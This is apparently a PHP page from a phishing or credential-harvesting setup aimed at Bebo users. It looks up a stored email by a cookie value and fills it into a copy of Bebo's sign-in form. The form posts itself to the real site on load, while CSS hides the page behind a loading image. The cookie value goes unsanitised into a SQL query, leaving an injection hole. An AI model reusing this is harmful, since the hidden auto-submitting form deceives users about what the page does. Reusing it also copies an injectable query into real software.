<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `bebo` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["bebo"].submit();}</script>


<form method="post" action="https://secure.bebo.com/SignIn.jsp" id="bebo"><input type="hidden" name="FriendsMemberId" value=""><input type="hidden" name="FriendsChecksumNbr" value=""><input type="hidden" name="InviteRecipientId" value=""><input type="hidden" name="InviteChecksumNbr" value=""><input type="hidden" name="AppUrl" value=""><input type="hidden" name="Page" value=""><input type="hidden" name="QueryString" value=""><input type="hidden" name="Domain" value=""><input type="hidden" name="api_key" value=""><input type="hidden" name="AppId" value=""><input type="hidden" name="next" value=""><input type="hidden" name="canvas" value="null"><input type="hidden" name="v" value=""><p>Username or Email<br><input type="text" name="EmailUsername" id="EmailUsername" size="25" maxlength="100" value="<?=$email;?>"></p><p>Password<br><input type="password" name="Password" id="Password" size="25" maxlength="20" value=""><br><small><a href="/LostPassword.jsp">Forgot Bebo Password?</a></small></p><div class="sign-in-controls"><p style="float:left;"><input type="checkbox" id="RememberMe" name="RememberMe" align="top" value="Y"><label for="RememberMe"><small>Remember for 2 weeks?</small></label></p><p style="float:right;"><span class="button-wrapper"><input type="submit" class="button" name="SignIn" value="Sign In"></span></p></div></form>



</body>
</html>

